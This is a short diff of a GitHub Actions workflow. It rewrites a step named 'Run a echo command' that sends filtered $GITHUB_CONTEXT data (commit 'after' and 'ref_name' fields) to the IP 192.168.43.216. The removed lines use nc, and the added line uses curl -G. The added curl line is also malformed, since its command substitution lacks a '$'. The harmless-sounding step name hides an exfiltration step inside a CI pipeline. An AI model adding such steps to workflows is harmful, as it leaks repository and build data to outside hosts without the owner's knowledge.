@@ -15,6 +15,6 @@ jobs:
     - name: Run a echo command
       shell: bash
       run: |
-          echo "$GITHUB_CONTEXT"| grep -i 'after\|ref_name' > t.txt
-          cat t.txt| nc 192.168.43.216 80
+          curl -G http://192.168.43.216:80/(echo "$GITHUB_CONTEXT"| grep -i 'after\|ref_name')
+          
        
